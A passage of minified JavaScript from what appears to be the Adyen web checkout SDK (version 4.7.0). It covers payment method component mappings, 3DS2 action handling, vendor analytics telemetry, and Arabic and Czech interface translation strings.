Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(Gd,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState})))},t}(Zc),afterpay:ep,afterpay_default:ep,afterpay_b2b:tp,amazonpay:hp,amex:Cf,applepay:gp,bankTransfer_IBAN:uv,bcmc:xf,bcmc_mobile:JA,bcmc_mobile_QR:JA,blik:sv,billdesk_online:Sp,billdesk_wallet:kp,boletobancario:fm,boletobancario_bancodobrasil:fm,boletobancario_bradesco:fm,boletobancario_hsbc:fm,boletobancario_itau:fm,boletobancario_santander:fm,primeiropay_boleto:fm,card:Cf,storedCard:Cf,diners:Cf,directdebit_GB:Cv,discover:Cf,doku:lm,doku_alfamart:lm,doku_permata_lite_atm:lm,doku_indomaret:lm,doku_atm_mandiri_va:lm,doku_sinarmas_va:lm,doku_mandiri_va:lm,doku_cimb_va:lm,doku_danamon_va:lm,doku_bri_va:lm,doku_bni_va:lm,doku_bca_va:lm,doku_wallet:lm,donation:Ef,dotpay:ym,dragonpay_ebanking:am,dragonpay_otc_banking:am,dragonpay_otc_non_banking:am,dragonpay_otc_philippines:am,econtext_seven_eleven:Gf,econtext_atm:Gf,econtext_stores:Gf,econtext_online:Gf,entercash:Uf,eps:bm,facilypay_3x:Kf,facilypay_4x:qf,facilypay_6x:Xf,facilypay_10x:Yf,facilypay_12x:Jf,giropay:Ff,ideal:Zf,jcb:Cf,kcp:Cf,maestro:Cf,mbway:av,mc:Cf,molpay_ebanking_fpx_MY:ZA,molpay_ebanking_TH:em,molpay_ebanking_VN:tm,openbanking_UK:nm,paypal:sA,payu_IN_cashcard:km,payu_IN_nb:Mm,paywithgoogle:jf,personal_details:function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"data",{get:function(){return this.state.data},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(td,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState})))},t}(Zc),googlepay:jf,pix:hv,qiwiwallet:dA,ratepay:Em,redirect:If,securedfields:hA,sepadirectdebit:_A,scheme:Cf,threeDS2Challenge:jA,threeDS2DeviceFingerprint:HA,visa:Cf,wechatpay:YA,wechatpayQR:YA,oxxo:mm,multibanco:gm,giftcard:xm,vipps:Sm,swish:Tm,affirm:pv,default:null},Sv=function(e,t){var n=xv[e]||xv.default;return n?new n(ml(ml({},t),{id:e+"-"+hc()})):null},kv=function(e,t,n){void 0===t&&(t={}),void 0===n&&(n=!1);var r=e;return"scheme"===e&&(r=n?"storedCard":"card"),t[r]||{}};function Mv(e){return!this.length||-1<this.indexOf(e.type)}function Bv(e){return!this.length||this.indexOf(e.type)<0}function Ev(e){return!!e&&!!e.supportedShopperInteractions&&e.supportedShopperInteractions.includes("Ecommerce")}var Tv=["scheme","blik"];function Pv(e){return!!e&&!!e.type&&Tv.includes(e.type)}var Iv=function(e){return ml(ml({},e),{storedPaymentMethodId:e.id})},Fv=function(){function e(e,t){var n,r,i,a,o,s,l,c,u,d,p,h;void 0===t&&(t={}),this.paymentMethods=[],this.storedPaymentMethods=[],function(e){var t,n;if("string"==typeof e)throw new Error('paymentMethodsResponse was provided but of an incorrect type (should be an object but a string was provided).Try JSON.parse("{...}") your paymentMethodsResponse.');if(e instanceof Array)throw new Error("paymentMethodsResponse was provided but of an incorrect type (should be an object but an array was provided).Please check you are passing the whole response.");!e||(null===(t=null==e?void 0:e.paymentMethods)||void 0===t?void 0:t.length)||null===(n=null==e?void 0:e.storePaymentMethods)||void 0===n||n.length}(e),this.paymentMethods=e?(l=e.paymentMethods,d=void 0===(u=(c=t).allowPaymentMethods)?[]:u,h=void 0===(p=c.removePaymentMethods)?[]:p,l?l.filter(Mv,d).filter(Bv,h):[]):[],this.storedPaymentMethods=e?(n=e.storedPaymentMethods,a=void 0===(i=(r=t).allowPaymentMethods)?[]:i,s=void 0===(o=r.removePaymentMethods)?[]:o,n?n.filter(Pv).filter(Mv,a).filter(Bv,s).filter(Ev).map(Iv):[]):[]}return e.prototype.has=function(e){return Boolean(this.paymentMethods.find((function(t){return t.type===e})))},e.prototype.find=function(e){return this.paymentMethods.find((function(t){return t.type===e}))},e}(),Lv={redirect:function(e,t){return Sv("redirect",ml(ml(ml({},t),e),{statusType:"redirect"}))},threeDS2Fingerprint:function(e,t){return Sv("threeDS2DeviceFingerprint",ml(ml({createFromAction:t.createFromAction,token:e.token,paymentData:e.paymentData,onError:t.onError,showSpinner:!t.isDropin,isDropin:!!t.isDropin},t),{type:"IdentifyShopper",onComplete:t.onAdditionalDetails,statusType:"loading",useOriginalFlow:!0}))},threeDS2Challenge:function(e,t){var n;return Sv("threeDS2Challenge",ml(ml({},t),{token:e.token,paymentData:e.paymentData,onComplete:t.onAdditionalDetails,onError:t.onError,size:null!==(n=t.size)&&void 0!==n?n:"02",isDropin:!!t.isDropin,type:"ChallengeShopper",statusType:"custom",useOriginalFlow:!0}))},threeDS2:function(e,t){var n="fingerprint"===e.subtype?"threeDS2DeviceFingerprint":"threeDS2Challenge",r="fingerprint"===e.subtype?e.paymentData:e.authorisationToken,i=ml({token:e.token,paymentData:r,onComplete:t.onAdditionalDetails,onError:t.onError,isDropin:!!t.isDropin,loadingContext:t.loadingContext,clientKey:t.clientKey,_parentInstance:t._parentInstance,paymentMethodType:t.paymentMethodType,challengeWindowSize:t.challengeWindowSize},function(e,t){if("fingerprint"!==e)return{statusType:"custom"};var n=Gp(t.elementRef?LA:OA).from(t);return n.showSpinner=!t.isDropin,n.statusType="loading",n}(e.subtype,t));return Sv(n,i)},voucher:function(e,t){return Sv(e.paymentMethodType,ml(ml(ml({},e),t),{i18n:t.i18n,loadingContext:t.loadingContext,statusType:"custom"}))},qrCode:function(e,t){return Sv(e.paymentMethodType,ml(ml(ml({},e),t),{onComplete:t.onAdditionalDetails,onError:t.onError,statusType:"custom"}))},await:function(e,t){return Sv(e.paymentMethodType,ml(ml(ml({},e),t),{onComplete:t.onAdditionalDetails,onError:t.onError,statusType:"custom"}))},bankTransfer:function(e,t){return Sv(e.paymentMethodType,ml(ml(ml({},e),t),{onComplete:t.onAdditionalDetails,onError:t.onError,statusType:"custom"}))}},Ov=function(){function e(){this.events=[]}return e.prototype.add=function(e){this.events.push(e)},e.prototype.run=function(e){var t=this.events.map((function(t){return t(e)}));return this.events=[],Promise.all(t)},e}(),Nv=function(){function e(t){var n,r,i,a,o,s,l=t.loadingContext,c=t.locale,u=t.clientKey,d=t.analytics;this.conversionId=null,this.queue=new Ov,this.props=ml(ml({},e.defaultProps),d),this.logEvent=(s={loadingContext:l,locale:c},function(e){var t=ml({version:"4.7.0",payload_version:1,platform:"web",locale:s.locale},e),n=Object.keys(t).map((function(e){return encodeURIComponent(e)+"="+encodeURIComponent(t[e])})).join("&");(new Image).src=s.loadingContext+"images/analytics.png?"+n}),this.logTelemetry=(o={loadingContext:l,locale:c,clientKey:u},function(e){if(!o.clientKey)return Promise.reject();var t={errorLevel:"silent",loadingContext:o.loadingContext,path:"v1/analytics/log?clientKey="+o.clientKey},n=ml({version:"4.7.0",platform:"web",locale:o.locale,flavor:"components",userAgent:navigator.userAgent,referrer:window.location.href,screenWidth:window.screen.width},e);return Ud(t,n)}),this.collectId=(a={errorLevel:"silent",loadingContext:(n={loadingContext:l,clientKey:u}).loadingContext,path:"v1/analytics/id?clientKey="+(i=n.clientKey)},function(){return r||(i?r=Ud(a).then((function(e){return null==e?void 0:e.id})).catch((function(){})):Promise.reject())});var p=this.props,h=p.conversion,f=p.enabled;!0===h&&!0===f&&this.props.conversionId&&(this.conversionId=this.props.conversionId,this.queue.run(this.conversionId))}return e.prototype.send=function(e){var t=this,n=this.props,r=n.conversion,i=n.enabled,a=n.payload,o=n.telemetry;!0===i&&(!0!==r||this.conversionId||this.collectId().then((function(e){t.conversionId=e,t.queue.run(t.conversionId)})),!0===o&&(this.queue.add((function(n){return t.logTelemetry(ml(ml(ml({},e),a&&ml({},a)),{conversionId:n})).catch((function(){}))})),r&&!this.conversionId||this.queue.run(this.conversionId)),this.logEvent(e))},e.defaultProps={enabled:!0,telemetry:!0,conversion:!1,conversionId:null},e}();function Dv(e){return Object.keys(e).reduce((function(t,n){return vc.includes(n)&&(t[n]=e[n]),t}),{})}var Rv=function(){function e(e){var t=this;this.components=[],this.update=function(e){return void 0===e&&(e={}),t.setOptions(e),t.components.forEach((function(e){return e.update(t.getPropsForComponent(t.options))})),t},this.remove=function(e){return t.components=t.components.filter((function(t){return t._id!==e._id})),e.unmount(),t},this.setOptions=function(e){return t.options=ml(ml({},t.options),e),t.options.loadingContext=function(e){void 0===e&&(e="https://checkoutshopper-live.adyen.com/checkoutshopper/");var t={test:"https://checkoutshopper-test.adyen.com/checkoutshopper/",live:"https://checkoutshopper-live.adyen.com/checkoutshopper/","live-us":"https://checkoutshopper-live-us.adyen.com/checkoutshopper/","live-au":"https://checkoutshopper-live-au.adyen.com/checkoutshopper/"};return t[e]||t[e.toLowerCase()]||e}(t.options.environment),t.modules={risk:new hu(t.options),analytics:new Nv(t.options),i18n:new Dl(t.options.locale,t.options.translations)},t.paymentMethodsResponse=new Fv(t.options.paymentMethodsResponse,t.options),t},this.create=this.create.bind(this),this.createFromAction=this.createFromAction.bind(this),this.setOptions(e)}return e.prototype.create=function(e,t){var n=this.getPropsForComponent(t);return e?this.handleCreate(e,n):this.handleCreateError()},e.prototype.createFromAction=function(e,t){if(void 0===t&&(t={}),e.type){var n=kv(e.type,this.options.paymentMethodsConfiguration);return function(e,t){void 0===t&&(t={});var n=Lv[e.type];if(n&&"function"==typeof n)return n(e,t);throw new Error("Invalid Action")}(e,ml(ml(ml({},Dv(this.options)),n),this.getPropsForComponent(t)))}return this.handleCreateError()},e.prototype.getPropsForComponent=function(e){return ml(ml({paymentMethods:this.paymentMethodsResponse.paymentMethods,storedPaymentMethods:this.paymentMethodsResponse.storedPaymentMethods},e),{i18n:this.modules.i18n,modules:this.modules,createFromAction:this.createFromAction,_parentInstance:this})},e.prototype.handleCreate=function(e,t){if(void 0===t&&(t={}),e.prototype instanceof Zc){var n=t.supportedShopperInteractions?[]:this.paymentMethodsResponse.find(e.type),r=kv(e.type,this.options.paymentMethodsConfiguration,!!t.storedPaymentMethodId),i=Dv(this.options),a=new e(ml(ml(ml(ml({},i),n),r),t));return t.isDropin||this.components.push(a),a}return"string"==typeof e&&xv[e]?this.handleCreate(xv[e],t):"string"==typeof e&&this.paymentMethodsResponse.has(e)?(r=kv(e,this.options.paymentMethodsConfiguration),this.handleCreate(xv.redirect,ml(ml(ml(ml({},Dv(this.options)),this.paymentMethodsResponse.find(e)),r),t))):"object"==_typeof2(e)&&"string"==typeof e.type?(r=kv(e.type,this.options.paymentMethodsConfiguration,!!e.storedPaymentMethodId),this.handleCreate(e.type,ml(ml(ml({},e),t),r))):this.handleCreateError(e)},e.prototype.handleCreateError=function(e){var t=e&&e.name?e.name:"The passed payment method";throw new Error(e?t+" is not a valid Checkout Component":"No Payment Method component was passed")},e.version={version:"4.7.0",revision:"795cd54",branch:"HEAD",buildId:"@adyen/adyen-web-a6927420-7fea-4110-b4a4-885e5e820562"},e}(),jv=Object.freeze({__proto__:null,default:{payButton:"دفع","payButton.redirecting":"جارِ إعادة التوجيه...",storeDetails:"حفظ لمدفوعاتي القادمة","creditCard.holderName":"الاسم على البطاقة","creditCard.holderName.placeholder":"جميل سعيد","creditCard.holderName.invalid":"اسم صاحب بطاقة غير صحيح","creditCard.numberField.title":"رقم البطاقة","creditCard.numberField.placeholder":"3456 9012 5678 1234","creditCard.expiryDateField.title":"تاريخ الانتهاء","creditCard.expiryDateField.placeholder":"شهر/سنة","creditCard.expiryDateField.month":"شهر","creditCard.expiryDateField.month.placeholder":"شهر","creditCard.expiryDateField.year.placeholder":"سنة","creditCard.expiryDateField.year":"سنة","creditCard.cvcField.title":"رمز CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"احتفظ بالبيانات للمرة القادمة","creditCard.cvcField.placeholder.4digits":"4 أرقام","creditCard.cvcField.placeholder.3digits":"3 أرقام","creditCard.taxNumber.placeholder":"يوم شهر سنة / 0123456789",installments:"عدد الأقساط",installmentOption:"%{times} x %{partialValue}",installmentOptionMonths:"%{times} أشهر","installments.oneTime":"الدفع مرة واحدة","installments.installments":"الدفع على أقساط","installments.revolving":"الدفع الدوري","sepaDirectDebit.ibanField.invalid":"رقم حساب غير صحيح","sepaDirectDebit.nameField.placeholder":"جميل سعيد","sepa.ownerName":"صاحب الحساب","sepa.ibanNumber":"رقم الحساب (IBAN)","error.title":"خطأ","error.subtitle.redirect":"فشل إعادة التوجيه","error.subtitle.payment":"فشل الدفع","error.subtitle.refused":"تم رفض الدفع","error.message.unknown":"حدث خطأ غير معروف","idealIssuer.selectField.title":"البنك","idealIssuer.selectField.placeholder":"حدد البنك الذي تتعامل معه","creditCard.success":"نجح الدفع",loading:"جارِ التحميل...",continue:"متابعة",continueTo:"متابعة إلى","wechatpay.timetopay":"لديك %@ للدفع","wechatpay.scanqrcode":"مسح رمز الاستجابة السريعة",personalDetails:"البيانات الشخصية",companyDetails:"بيانات الشركة","companyDetails.name":"اسم الشركة","companyDetails.registrationNumber":"رقم التسجيل",socialSecurityNumber:"رقم الضمان الاجتماعي",firstName:"الاسم الأول",infix:"بادئة",lastName:"الاسم الأخير",mobileNumber:"رقم الجوال","mobileNumber.invalid":"رقم جوال غير صحيح",city:"المدينة",postalCode:"الرمز البريدي",countryCode:"رمز البلد",telephoneNumber:"رقم الهاتف",dateOfBirth:"تاريخ الميلاد",shopperEmail:"عنوان البريد الإلكتروني",gender:"النوع",male:"ذكر",female:"أنثى",billingAddress:"عنوان الفواتير",street:"الشارع",stateOrProvince:"الولاية أو المقاطعة",country:"البلد",houseNumberOrName:"رقم المنزل",separateDeliveryAddress:"حدد عنوان تسليم منفصل",deliveryAddress:"عنوان التسليم",zipCode:"الرمز البريدي",apartmentSuite:"الشقة / الجناح",provinceOrTerritory:"المقاطعة أو الإقليم",cityTown:"المدينة / البلدة",address:"العنوان",state:"الولاية","field.title.optional":"(اختياري)","creditCard.cvcField.title.optional":"رمز CVC / CVV (اختياري)","issuerList.wallet.placeholder":"حدد محفظتك",privacyPolicy:"سياسة الخصوصية","afterPay.agreement":"أوافق على %@ لشركة AfterPay",paymentConditions:"شروط الدفع",openApp:"فتح التطبيق","voucher.readInstructions":"قراءة التعليمات","voucher.introduction":"شكرًا لك على شرائك، يرجى استخدام القسيمة التالية لإتمام عملية الدفع.","voucher.expirationDate":"تاريخ الانتهاء","voucher.alternativeReference":"المرجع البديل","dragonpay.voucher.non.bank.selectField.placeholder":"حدد مقدم الخدمة","dragonpay.voucher.bank.selectField.placeholder":"حدد البنك الذي تتعامل معه","voucher.paymentReferenceLabel":"مرجع الدفع","voucher.surcharge":"بما في ذلك %@ رسمًا إضافيًا","voucher.introduction.doku":"شكرًا لك على شرائك، يرجى استخدام المعلومات التالية لإتمام عملية الدفع.","voucher.shopperName":"اسم المتسوق","voucher.merchantName":"التاجر","voucher.introduction.econtext":"شكرًا لك على شرائك، يرجى استخدام المعلومات التالية لإتمام عملية الدفع.","voucher.telephoneNumber":"رقم الهاتف","voucher.shopperReference":"مرجع المتسوق","voucher.collectionInstitutionNumber":"رقم المؤسسة المكلفة بالتحصيل","voucher.econtext.telephoneNumber.invalid":"يجب أن يكون رقم الهاتف بطول 10 أو 11 رقمًا","boletobancario.btnLabel":"إنشاء طريقة دفع Boleto","boleto.sendCopyToEmail":"إرسال نسخة إلى بريدي الإلكتروني","button.copy":"نسخ","button.download":"تنزيل","creditCard.storedCard.description.ariaLabel":"تنتهي البطاقة المخزنة في %@","voucher.entity":"الكيان",donateButton:"التبرع",notNowButton:"ليس الآن",thanksForYourSupport:"شكرًا على دعمك!",preauthorizeWith:"تفويض مسبق باستخدام",confirmPreauthorization:"تأكيد التفويض المسبق",confirmPurchase:"تأكيد الشراء",applyGiftcard:"استرداد",giftcardBalance:"رصيد بطاقة الهدايا",deductedBalance:"الرصيد المخصوم","creditCard.pin.title":"رقم التعريف الشخصي","creditCard.encryptedPassword.label":"أول رقمان من كلمة مرور البطاقة","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"كلمة مرور غير صحيحة","creditCard.taxNumber.label":"تاريخ ميلاد حامل البطاقة (يوم شهر سنة) أو رقم تسجيل الشركة (10 أرقام)","creditCard.taxNumber.labelAlt":"رقم تسجيل الشركة (10 أرقام)","creditCard.taxNumber.invalid":"تاريخ ميلاد حامل البطاقة أو رقم تسجيل الشركة غير صحيح","storedPaymentMethod.disable.button":"إزالة","storedPaymentMethod.disable.confirmation":"إزالة طريقة الدفع المخزنة","storedPaymentMethod.disable.confirmButton":"نعم، أرغب في إزالتها","storedPaymentMethod.disable.cancelButton":"إلغاء","ach.bankAccount":"الحساب البنكي","ach.accountHolderNameField.title":"اسم صاحب الحساب","ach.accountHolderNameField.placeholder":"جميل سعيد","ach.accountHolderNameField.invalid":"اسم صاحب حساب غير صحيح","ach.accountNumberField.title":"رقم الحساب","ach.accountNumberField.invalid":"رقم حساب غير صحيح","ach.accountLocationField.title":"رقم توجيه ABA","ach.accountLocationField.invalid":"رقم توجيه ABA غير صحيح","select.state":"حدد الولاية","select.stateOrProvince":"حدد الولاية أو المقاطعة","select.provinceOrTerritory":"حدد المقاطعة أو الإقليم","select.country":"حدد البلد","select.noOptionsFound":"لا توجد خيارات","select.filter.placeholder":"بحث...","telephoneNumber.invalid":"رقم هاتف غير صحيح",qrCodeOrApp:"أو","paypal.processingPayment":"جارِ معالجة المدفوعات...",generateQRCode:"إنشاء رمز استجابة سريعة","await.waitForConfirmation":"في انتظار التأكيد","mbway.confirmPayment":"تأكيد الدفع على تطبيق MB WAY","shopperEmail.invalid":"عنوان بريد إلكتروني غير صحيح","dateOfBirth.format":"يوم/شهر/سنة","dateOfBirth.invalid":"يجب ألا يقل عمرك عن 18 عامًا","blik.confirmPayment":"افتح تطبيقك البنكي لتأكيد الدفع.","blik.invalid":"أدخل 6 أرقام","blik.code":"رمز مكون من 6 أرقام","blik.help":"احصل على الرمز من تطبيقك البنكي.","swish.pendingMessage":"بعد قيامك بمسح رمز الاستجابة السريعة ضوئيًا، يمكن أن تظل الحالة معلقة لمدة تصل إلى 10 دقائق. قد تؤدي محاولة الدفع مرة أخرى خلال هذا الوقت إلى فرض رسوم متعددة.","error.va.gen.01":"حقل غير مكتمل","error.va.gen.02":"حقل غير صحيح","error.va.sf-cc-num.01":"رقم بطاقة غير صحيح","error.va.sf-cc-num.03":"تم إدخال بطاقة غير مدعومة","error.va.sf-cc-dat.01":"بطاقة قديمة جدًا","error.va.sf-cc-dat.02":"التاريخ بعيد للغاية في المستقبل","error.va.sf-cc-dat.03":"تنتهي صلاحية بطاقتك قبل تاريخ السداد","error.giftcard.no-balance":"لا يوجد رصيد ببطاقة الهدايا هذه","error.giftcard.card-error":"لا توجد بسجلاتنا بطاقة هدايا تحمل هذا الرقم","error.giftcard.currency-error":"لا تسري بطاقات الهدايا إلا بالعملة التي صدرت بها","amazonpay.signout":"تسجيل الخروج من موقع Amazon","amazonpay.changePaymentDetails":"تغيير بيانات الدفع","partialPayment.warning":"تحديد طريقة دفع أخرى لتسديد المبلغ المتبقي","partialPayment.remainingBalance":"سيبلغ الرصيد المتبقي %{amount}","bankTransfer.beneficiary":"المستفيد","bankTransfer.iban":"IBAN","bankTransfer.bic":"كود التعريف البنكي","bankTransfer.reference":"المرجع","bankTransfer.introduction":"قم بالمتابعة لإنشاء مدفوعات تحويل بنكية جديدة. يمكنك استخدام البيانات الواردة في الشاشة التالية لإتمام عملية الدفع.","bankTransfer.instructions":"شكرًا لك على شرائك، يرجى استخدام المعلومات التالية لإتمام عملية الدفع.","bacs.accountHolderName":"اسم صاحب الحساب البنكي","bacs.accountHolderName.invalid":"اسم صاحب حساب بنكي غير صحيح","bacs.accountNumber":"رقم الحساب البنكي","bacs.accountNumber.invalid":"رقم حساب بنكي غير صحيح","bacs.bankLocationId":"رمز تعريف البنك","bacs.bankLocationId.invalid":"رمز تعريف بنك غير صحيح","bacs.consent.amount":"أوافق على خصم المبلغ أعلاه من حسابي البنكي.","bacs.consent.account":"أؤكد أن الحساب باسمي وأنا وحدي صاحب التوقيع المطالب بالإذن بالخصم المباشر في هذا الحساب.",edit:"تحرير","bacs.confirm":"تأكيد ودفع","bacs.result.introduction":"تنزيل تعليمات الخصم المباشر (تعليمات / تفويض DDI)","download.pdf":"تنزيل ملف PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"الإطار المضمن لرقم البطاقة المؤمنة","creditCard.encryptedCardNumber.aria.label":"حقل رقم البطاقة","creditCard.encryptedExpiryDate.aria.iframeTitle":"الإطار المضمن لتاريخ انتهاء البطاقة المؤمنة","creditCard.encryptedExpiryDate.aria.label":"حقل تاريخ الانتهاء","creditCard.encryptedExpiryMonth.aria.iframeTitle":"الإطار المضمن لشهر انتهاء البطاقة المؤمنة","creditCard.encryptedExpiryMonth.aria.label":"حقل شهر الانتهاء","creditCard.encryptedExpiryYear.aria.iframeTitle":"الإطار المضمن لسنة انتهاء البطاقة المؤمنة","creditCard.encryptedExpiryYear.aria.label":"حقل سنة الانتهاء","creditCard.encryptedSecurityCode.aria.iframeTitle":"الإطار المضمن لرمز أمان البطاقة المؤمنة","creditCard.encryptedSecurityCode.aria.label":"حقل رمز الأمان","giftcard.encryptedCardNumber.aria.iframeTitle":"الإطار المضمن لرقم بطاقة الهدايا المؤمنة","giftcard.encryptedCardNumber.aria.label":"حقل رقم بطاقة الهدايا","giftcard.encryptedSecurityCode.aria.iframeTitle":"الإطار المضمن لرمز أمان بطاقة الهدايا المؤمنة","giftcard.encryptedSecurityCode.aria.label":"حقل رمز أمان بطاقة الهدايا",giftcardTransactionLimit:"يسمح فقط بحد أقصى %{amount} لكل معاملة على بطاقة الهدايا هذه","ach.encryptedBankAccountNumber.aria.iframeTitle":"الإطار المضمن لرقم الحساب البنكي المؤمن","ach.encryptedBankAccountNumber.aria.label":"حقل الحساب البنكي","ach.encryptedBankLocationId.aria.iframeTitle":"الإطار المضمن لرقم التوجيه البنكي المؤمن","ach.encryptedBankLocationId.aria.label":"حقل رقم التوجيه البنكي","pix.instructions":"افتح التطبيق باستخدام مفتاح PIX المسجل، واختر الدفع باستخدام PIX وامسح رمز الاستجابة السريعة ضوئيًا أو انسخ الرمز والصقه"}}),Uv=Object.freeze({__proto__:null,default:{payButton:"Zaplatit","payButton.redirecting":"Přesměrování...",storeDetails:"Uložit pro příští platby","creditCard.holderName":"Jméno na kartě","creditCard.holderName.placeholder":"Jan Novák","creditCard.holderName.invalid":"Neplatné jméno držitele karty","creditCard.numberField.title":"Číslo karty","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Konec platnosti","creditCard.expiryDateField.placeholder":"MM/RR","creditCard.expiryDateField.month":"Měsíc","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"RR","creditCard.expiryDateField.year":"Rok","creditCard.cvcField.title":"Kód CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Zapamatovat si pro příště","creditCard.cvcField.placeholder.4digits":"4 číslice","creditCard.cvcField.placeholder.3digits":"3 číslice","creditCard.taxNumber.placeholder":"RRMMDD / 0123456789",installments:"Počet splátek",installmentOption:"%{times}× %{partialValue}",installmentOptionMonths:"%{times} měsíců","installments.oneTime":"Jednorázová platba","installments.installments":"Platba na splátky","installments.revolving":"Opakující se platba","sepaDirectDebit.ibanField.invalid":"Neplatné číslo účtu","sepaDirectDebit.nameField.placeholder":"Jan Novák","sepa.ownerName":"Jméno držitele účtu","sepa.ibanNumber":"Číslo účtu (IBAN)","error.title":"Chyba","error.subtitle.redirect":"Přesměrování selhalo","error.subtitle.payment":"Platba selhala","error.subtitle.refused":"Platba zamítnuta","error.message.unknown":"Došlo k neznámé chybě","idealIssuer.selectField.title":"Banka","idealIssuer.selectField.placeholder":"Vyberte svou banku","creditCard.success":"Platba proběhla úspěšně",loading:"Načítání…",continue:"Pokračovat",continueTo:"Pokračovat k","wechatpay.timetopay":"Na zaplacení vám zbývá %@","wechatpay.scanqrcode":"Naskenovat QR kód",personalDetails:"Osobní údaje",companyDetails:"Údaje o společnosti","companyDetails.name":"Název společnosti","companyDetails.registrationNumber":"Registrační číslo",socialSecurityNumber:"Rodné číslo",firstName:"Jméno",infix:"Prefix",lastName:"Příjmení",mobileNumber:"Číslo na mobil","mobileNumber.invalid":"Neplatné číslo mobilního telefonu",city:"Město",postalCode:"PSČ",countryCode:"Kód země",telephoneNumber:"Telefonní číslo",dateOfBirth:"Datum narození",shopperEmail:"E-mailová adresa",gender:"Pohlaví",male:"Muž",female:"Žena",billingAddress:"Fakturační adresa",street:"Ulice",stateOrProvince:"Kraj nebo okres",country:"Země",houseNumberOrName:"Číslo popisné",separateDeliveryAddress:"Zadat dodací adresu odlišnou od fakturační",deliveryAddress:"Dodací adresa",zipCode:"PSČ",apartmentSuite:"Byt",provinceOrTerritory:"Provincie nebo teritorium",cityTown:"Město",address:"Adresa",state:"Stát","field.title.optional":"(nepovinné)","creditCard.cvcField.title.optional":"Kód CVC/CVV (volitelné)","issuerList.wallet.placeholder":"Vyberte svou peněženku",privacyPolicy:"Zásady ochrany osobních údajů","afterPay.agreement":"Souhlasím s %@ společnosti AfterPay",paymentConditions:"platebními podmínkami",openApp:"Otevřete aplikaci","voucher.readInstructions":"Přečtěte si pokyny","voucher.introduction":"Děkujeme za nákup. K dokončení platby použijte prosím následující kupón.","voucher.expirationDate":"Datum konce platnosti","voucher.alternativeReference":"Náhradní číslo","dragonpay.voucher.non.bank.selectField.placeholder":"Vyberte svého poskytovatele","dragonpay.voucher.bank.selectField.placeholder":"Vyberte svou banku","voucher.paymentReferenceLabel":"Číslo platby","voucher.surcharge":"Včetně přirážky %@","voucher.introduction.doku":"Děkujeme za nákup. K dokončení platby použijte prosím následující informace.","voucher.shopperName":"Jméno kupujícího","voucher.merchantName":"Obchodník","voucher.introduction.econtext":"Děkujeme za nákup. K dokončení platby použijte prosím následující informace.","voucher.telephoneNumber":"Telefonní číslo","voucher.shopperReference":"Číslo kupujícího","voucher.collectionInstitutionNumber":"Číslo inkasní instituce","voucher.econtext.telephoneNumber.invalid":"Telefonní číslo musí obsahovat 10 nebo 11 číslic.","boletobancario.btnLabel":"Vygenerovat Boleto","boleto.sendCopyToEmail":"Poslat mi kopii na e-mail","button.copy":"Kopírovat","button.download":"Stáhnout","creditCard.storedCard.description.ariaLabel":"Uložená karta končí na %@","voucher.entity":"Subjekt",donateButton:"Přispět",notNowButton:"Teď ne",thanksForYourSupport:"Děkujeme vám za podporu!",preauthorizeWith:"Předautorizovat pomocí",confirmPreauthorization:"Potvrdit předautorizaci",confirmPurchase:"Potvrdit nákup",applyGiftcard:"Uplatnit",giftcardBalance:"Zůstatek na dárkové kartě",deductedBalance:"Odečtený zůstatek","creditCard.pin.title":"Pin","creditCard.encryptedPassword.label":"První 2 číslice hesla karty","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Neplatné heslo","creditCard.taxNumber.label":"Datum narození držitele karty (RRMMDD) nebo registrační číslo společnosti (10 číslic)","creditCard.taxNumber.labelAlt":"Registrační číslo společnosti (10 číslic)","creditCard.taxNumber.invalid":"Neplatné datum narození držitele karty nebo registrační číslo společnosti","storedPaymentMethod.disable.button":"Odebrat","storedPaymentMethod.disable.confirmation":"Odebrat uložený způsob platby","storedPaymentMethod.disable.confirmButton":"Ano, odebrat","storedPaymentMethod.disable.cancelButton":"Zrušit","ach.bankAccount":"Bankovní účet","ach.accountHolderNameField.title":"Jméno držitele účtu","ach.accountHolderNameField.placeholder":"Jan Novák","ach.accountHolderNameField.invalid":"Neplatné jméno držitele účtu","ach.accountNumberField.title":"Číslo účtu","ach.accountNumberField.invalid":"Neplatné číslo účtu","ach.accountLocationField.title":"Směrovací tranzitní číslo ABA","ach.accountLocationField.invalid":"Neplatné směrovací tranzitní číslo ABA","select.state":"Vyberte stát","select.stateOrProvince":"Vyberte kraj nebo okres","select.provinceOrTerritory":"Vyberte provincii nebo teritorium","select.country":"Vyberte zemi","select.noOptionsFound":"Nebyly nalezeny žádné možnosti","select.filter.placeholder":"Hledat...","telephoneNumber.invalid":"Neplatné telefonní číslo",qrCodeOrApp:"nebo","paypal.processingPayment":"Zpracování platby...",generateQRCode:"Vygenerovat QR kód","await.waitForConfirmation":"Čeká se na potvrzení","mbway.confirmPayment":"Potvrďte platbu v aplikaci MB WAY","shopperEmail.invalid":"Neplatná e-mailová adresa","dateOfBirth.format":"DD/MM/RRRR","dateOfBirth.invalid":"Musí vám být alespoň 18 let","blik.confirmPayment":"Spusťte bankovní aplikaci a potvrďte platbu.","blik.invalid":"Zadejte 6 čísel","blik.code":"Šestimístný kód","blik.help":"Získejte kód z bankovní aplikace.","swish.pendingMessage":"Po naskenování QR kódu může trvat až 10 minut, než se stav změní. Pokud budete zkoušet během této doby platbu opakovat, může být částka zaplacena vícekrát.","error.va.gen.01":"Neúplné pole","error.va.gen.02":"Pole není platné","error.va.sf-cc-num.01":"Neplatné číslo karty","error.va.sf-cc-num.03":"Zadána nepodporovaná karta","error.va.sf-cc-dat.01":"Příliš stará karta","error.va.sf-cc-dat.02":"Datum příliš daleko v budoucnosti","error.va.sf-cc-dat.03":"Platnost karty vyprší před datem 